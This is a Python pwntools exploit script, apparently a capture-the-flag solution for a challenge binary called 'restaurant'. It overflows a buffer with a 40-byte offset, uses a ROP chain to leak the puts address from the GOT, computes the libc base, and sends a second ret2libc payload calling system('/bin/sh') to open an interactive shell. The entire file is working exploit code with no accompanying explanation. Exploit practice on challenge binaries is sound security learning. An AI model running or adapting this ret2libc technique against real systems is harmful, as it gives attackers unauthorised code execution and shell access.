#!/usr/bin/python3

from pwn import *

context.log_level = 'info'
binary = './restaurant' # Binary name
io = process(binary) # Start binary process
#io = remote('138.68.178.56',30948)

#Binary enumaration
elf = context.binary = ELF(binary,checksec=False) # Automatically get contex,arch,os etc..
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rsp_offset = 40
pop_rdi = 0x4010a3
ret = 0x40063e

info("Instruction pointer offset: %#s",rsp_offset)
info("Pop rdi address: %#x",pop_rdi)

#Leaking puts address
leaking_payload = rsp_offset * b'a' + p64(pop_rdi) + p64(elf.got.puts) + p64(elf.plt.puts) + p64(elf.symbols['main'])
io.sendlineafter('>','1')
io.sendlineafter('>',leaking_payload)
puts_address = io.recvuntil('>').split()[3][::-1][:4:]
puts_address = u64(puts_address.rjust(8,b'\x00'),endian='BIG')
log.success(f'Leaked puts address at: {hex(puts_address)}')

#Triggering payload
libc.address = puts_address - libc.symbols['puts']
log.success(f'Calculated libc address at: {hex(libc.address)}')

#Pulling system and /bin/sh address
system_address = libc.symbols['system']
bin_sh_address = next(libc.search(b"/bin/sh"))
log.info(f'System address at: {hex(system_address)}')
log.info(f'/bin/sh address at: {hex(bin_sh_address)}')

#Creating shell payload 
log.info(f'Creating the payload...')
payload = b'a' * rsp_offset + p64(pop_rdi) + p64(bin_sh_address) + p64(system_address)

#Triggering payload
io.sendline('1')
io.sendlineafter('>',payload)
io.interactive()
